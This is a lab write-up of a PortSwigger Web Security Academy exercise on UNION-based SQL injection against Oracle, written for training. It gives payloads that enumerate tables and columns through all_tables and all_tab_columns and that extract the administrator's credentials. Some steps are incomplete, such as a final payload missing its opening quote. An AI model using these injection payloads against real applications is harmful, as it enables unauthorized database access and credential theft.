
# Lab: SQL Injection – Listing the Database Contents on Oracle

**Platform:** PortSwigger Web Security Academy  
**Vulnerability:** SQL Injection (UNION-based)

## Objectives

1. Find the database name and type.
    
2. Find the table containing usernames and passwords.
    
3. Retrieve the administrator's username and password.
    
4. Log in as the administrator.
    

## My Approach

### 1. Identifying the database type

I already knew that the database was Oracle, so I skipped this step.

### 2. Finding the number of columns

First, I tried to find the number of columns in the original query.

**Payload:**

```
ORDER BY 3--
```

**Result:** The application returned a 500 Internal Server Error.

### 3. Finding the table name

Since the database was Oracle, I used `all_tables` to find the available table names.

**Payload:**

```
' UNION SELECT table_name, NULL FROM all_tables--
```

**Found table:**

```
USERS_KYSYGX
```

### 4. Finding the username and password columns

After finding the table, I used `all_tab_columns` to check its column names.

**Payload:**

```
' UNION SELECT column_name, NULL
FROM all_tab_columns
WHERE table_name = 'USERS_KYSYGX'--
```

**Found columns:**

- Username: `USERNAME_FRSIDQ`
    
- Password: `PASSWORD_WNWDQG`
    

### 5. Retrieving the administrator credentials

Once I had the table and column names, I used a SELECT query to retrieve the username and password.

**Payload:**

```
UNION SELECT USERNAME_FRSIDQ, PASSWORD_WNWDQG
FROM USERS_KYSYGX--
```

**Retrieved credentials:**

- Username: `administrator`
    
- Password: `[Redacted]`
    

### 6. Final step

Used the recovered administrator credentials to log in and complete the lab.

## Key Learnings

- Learned how to enumerate tables in an Oracle database using `all_tables`.
    
- Learned how to find column names using `all_tab_columns`.
    
- Practiced UNION-based SQL injection on an Oracle database.
    
- Understood how database-specific metadata views are used to find information.
    
- Practiced retrieving data after identifying the correct table and columns.
    

**Lab Status:** Completed